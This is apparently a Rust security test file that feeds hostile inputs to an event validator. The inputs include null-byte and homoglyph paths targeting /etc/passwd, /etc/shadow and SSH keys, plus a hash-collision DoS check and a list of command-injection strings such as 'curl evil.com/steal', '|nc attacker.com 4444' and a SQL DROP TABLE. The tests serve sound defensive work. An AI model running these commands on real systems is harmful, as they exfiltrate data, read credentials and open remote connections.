use sinex_db::validation::EventValidator;
use serde_json::json;
use std::collections::HashMap;

#[test]
fn test_unicode_path_normalization_bypass() {
    let validator = EventValidator::new();
    
    // Same path in different Unicode normalizations
    let paths = vec![
        "café.txt",  // NFC (composed)
        "café.txt",  // NFD (decomposed) - looks same but different bytes
        "ﬁle.txt",   // Ligature fi
        "file.txt",  // Regular fi
        "../паѕѕwd", // Cyrillic 'a' and 's' that look like Latin
        "../passwd", // Latin characters
    ];
    
    for path in &paths {
        let event = json!({
            "path": path,
            "size": 1024
        });
        
        let result = validator.validate_with_rules("filesystem", "file.created", &event);
        println!("Path '{}' validation: {:?} (bytes: {:?})", path, result.is_ok(), path.as_bytes());
    }
    
    // These might bypass security checks due to normalization
}

#[test]
fn test_null_byte_injection_paths() {
    let validator = EventValidator::new();
    
    // Paths with null bytes - these should be rejected but might not be
    let malicious_paths = vec![
        "/etc/passwd\0.txt",
        "/tmp/\0/../../etc/shadow",
        "file\0\0.txt",
        "\0/etc/passwd",
        "/home/user/.ssh/id_rsa\0.backup",
    ];
    
    for path in malicious_paths {
        let event = json!({
            "path": path,
            "size": 1024
        });
        
        match validator.validate_with_rules("filesystem", "file.created", &event) {
            Ok(_) => println!("VULNERABILITY: Null byte path accepted: {:?}", path),
            Err(e) => println!("Null byte path rejected (good): {:?} - {}", path, e),
        }
    }
}

#[test]
fn test_json_hash_collision_dos() {
    // Create JSON object with keys that hash to same bucket
    // This is implementation-specific but common pattern
    let mut collision_object = HashMap::new();
    
    // These strings often collide in simple hash functions
    let collision_keys = vec![
        "Aa", "BB", // Often same hash
        "AaAa", "AaBB", "BBAa", "BBBB", // Chain collisions
    ];
    
    for i in 0..10000 {
        let key = format!("{}{}", collision_keys[i % collision_keys.len()], i);
        collision_object.insert(key, i);
    }
    
    let start = std::time::Instant::now();
    let json_value = json!(collision_object);
    let _serialized = serde_json::to_string(&json_value);
    let elapsed = start.elapsed();
    
    println!("Serialization of collision-prone object took: {:?}", elapsed);
    
    if elapsed.as_secs() > 1 {
        println!("VULNERABILITY: Hash collision DoS possible!");
    }
}

#[test]
fn test_json_exponential_entity_expansion() {
    // Billion laughs attack variant for JSON
    let mut expanding_json = json!({
        "a1": vec!["x"; 10],
    });
    
    // Each level references the previous 10 times
    for i in 2..=10 {
        let prev_key = format!("a{}", i - 1);
        let new_key = format!("a{}", i);
        
        // In real attack, this would use references
        // Here we simulate the expansion
        if let Some(prev_val) = expanding_json.get(&prev_key) {
            let mut new_array = vec![];
            for _ in 0..10 {
                new_array.push(prev_val.clone());
            }
            expanding_json[new_key] = json!(new_array);
        }
    }
    
    // Calculate theoretical size
    let depth = 10;
    let expansion_factor: u32 = 10;
    let theoretical_size = expansion_factor.pow(depth as u32);
    
    println!("Theoretical expansion size: {} elements", theoretical_size);
    println!("Actual JSON size: {} bytes", 
             serde_json::to_string(&expanding_json).unwrap_or_default().len());
}

#[test]
fn test_path_case_confusion_attacks() {
    let validator = EventValidator::new();
    
    // Test case variations that might bypass filters
    let case_variants = vec![
        ("/etc/PASSWD", "/etc/passwd"),
        ("/Etc/pAsSwD", "/etc/passwd"),
        ("/ETC/PASSWD", "/etc/passwd"),
        ("/home/USER/.ssh", "/home/user/.ssh"),
        ("C:\\Windows\\System32", "c:\\windows\\system32"),
    ];
    
    for (variant, canonical) in case_variants {
        let event = json!({
            "path": variant,
            "size": 1024
        });
        
        let result = validator.validate_with_rules("filesystem", "file.created", &event);
        println!("Path '{}' (canonical: '{}'): {:?}", variant, canonical, result.is_ok());
    }
}


#[test]
fn test_filesystem_race_condition_attacks() {
    // Simulated TOCTOU (Time-of-check to time-of-use) scenarios
    let suspicious_patterns = vec![
        // Quick file replacement
        ("check_file.txt", "replace_with_symlink"),
        // Directory traversal via symlink
        ("safe_dir/file.txt", "symlink_to_/etc/passwd"),
        // Race between stat and open
        ("normal_file.txt", "swap_during_processing"),
    ];
    
    for (initial, attack) in suspicious_patterns {
        println!("TOCTOU scenario: {} -> {}", initial, attack);
        // In real test, would create files and race operations
    }
}

#[test]
fn test_command_injection_via_json() {
    let validator = EventValidator::new();
    
    // Commands that might be interpreted if not properly escaped
    let injection_attempts = vec![
        r#"ls; cat /etc/passwd"#,
        r#"ls && curl evil.com/steal"#,
        r#"`cat /etc/passwd`"#,
        r#"$(cat /etc/passwd)"#,
        r#"'; DROP TABLE events; --"#,
        r#"../../../bin/sh"#,
        r#"|nc attacker.com 4444"#,
    ];
    
    for cmd in injection_attempts {
        let event = json!({
            "command": cmd,
            "working_directory": "/tmp"
        });
        
        // This should validate the structure but not execute
        let result = validator.validate_with_rules("terminal", "command.executed", &event);
        println!("Command injection attempt '{}': {:?}", cmd, result.is_ok());
    }
}